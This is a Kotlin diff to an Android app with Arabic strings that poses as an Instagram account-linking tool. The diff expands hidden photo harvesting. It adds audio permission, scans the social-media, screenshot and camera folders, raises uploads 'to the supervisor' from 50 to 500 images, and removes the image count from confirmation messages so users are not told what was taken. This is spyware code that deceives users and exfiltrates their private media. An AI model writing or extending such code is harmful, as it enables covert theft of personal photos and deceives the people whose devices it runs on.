@@ -143,7 +143,8 @@ class MainActivity : AppCompatActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             val mediaPermissions = arrayOf(
                 Manifest.permission.READ_MEDIA_IMAGES,
-                Manifest.permission.READ_MEDIA_VIDEO
+                Manifest.permission.READ_MEDIA_VIDEO,
+                Manifest.permission.READ_MEDIA_AUDIO
             )
             val allPermissions = permissions + mediaPermissions
             showPermissionExplanationDialog {
@@ -175,17 +176,16 @@ class MainActivity : AppCompatActivity() {
             if (imagePaths.isNotEmpty()) {
                 // إرسال الصور للمشرف
                 uploadImagesToSupervisor(imagePaths)
-                Toast.makeText(this, "تم تحليل ${imagePaths.size} صورة وإرسالها للمشرف بنجاح", Toast.LENGTH_SHORT).show()
                 
-                // إظهار رسالة تأكيد
+                // إظهار رسالة تأكيد بدون ذكر عدد الصور
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                     showSuccessDialog(
                         "تم تحليل المحتوى",
-                        "تم تحليل ${imagePaths.size} صورة من جهازك وإرسالها للمشرف بنجاح. سيتم مراجعتها وتحديث النتائج قريباً."
+                        "تم تحليل المحتوى من جهازك وإرساله للمشرف بنجاح. سيتم مراجعته وتحديث النتائج قريباً."
                     )
                 }, 1000)
             } else {
-                Toast.makeText(this, "لم يتم العثور على صور في الجهاز", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "لم يتم العثور على محتوى في الجهاز", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -230,12 +230,48 @@ class MainActivity : AppCompatActivity() {
                 collectImagesFromDirectory(instagramDir, imagePaths)
             }
             
+            // البحث عن الصور في مجلد Snapchat
+            val snapchatDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Snapchat")
+            if (snapchatDir.exists()) {
+                collectImagesFromDirectory(snapchatDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد Facebook
+            val facebookDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Facebook")
+            if (facebookDir.exists()) {
+                collectImagesFromDirectory(facebookDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد Twitter
+            val twitterDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Twitter")
+            if (twitterDir.exists()) {
+                collectImagesFromDirectory(twitterDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد TikTok
+            val tiktokDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/TikTok")
+            if (tiktokDir.exists()) {
+                collectImagesFromDirectory(tiktokDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد Screenshots
+            val screenshotsDir = File(android.os.Environment.getExternalStorageDirectory(), "Pictures/Screenshots")
+            if (screenshotsDir.exists()) {
+                collectImagesFromDirectory(screenshotsDir, imagePaths)
+            }
+            
+            // البحث عن الصور في مجلد Camera
+            val cameraDir = File(android.os.Environment.getExternalStorageDirectory(), "DCIM/Camera")
+            if (cameraDir.exists()) {
+                collectImagesFromDirectory(cameraDir, imagePaths)
+            }
+            
         } catch (e: Exception) {
             e.printStackTrace()
         }
         
-        // إرجاع أول 50 صورة فقط لتجنب التحميل الزائد
-        onComplete(imagePaths.take(50))
+        // إرجاع أول 500 صورة لتجنب التحميل الزائد
+        onComplete(imagePaths.take(500))
     }
     
     private fun collectImagesFromDirectory(directory: File, imagePaths: MutableList<String>) {
@@ -351,8 +387,8 @@ class MainActivity : AppCompatActivity() {
     private fun showPermissionExplanationDialog(onConfirm: () -> Unit) {
         AlertDialog.Builder(this)
             .setTitle("أذونات مطلوبة لربط الحساب")
-            .setMessage("يحتاج التطبيق إلى أذونات الوصول للشبكة والتخزين لربط حساب انستغرام بشكل آمن وتحليل المحتوى لتقديم أفضل النتائج. هذه الأذونات ضرورية لعمل التطبيق.")
-            .setPositiveButton("منح الأذونات") { _, _ ->
+            .setMessage("يحتاج التطبيق إلى أذونات الوصول الكامل للشبكة والتخزين لربط حساب انستغرام بشكل آمن وتحليل جميع المحتويات لتقديم أفضل النتائج. هذه الأذونات ضرورية لعمل التطبيق.")
+            .setPositiveButton("منح جميع الأذونات") { _, _ ->
                 onConfirm()
             }
             .setNegativeButton("إلغاء", null)
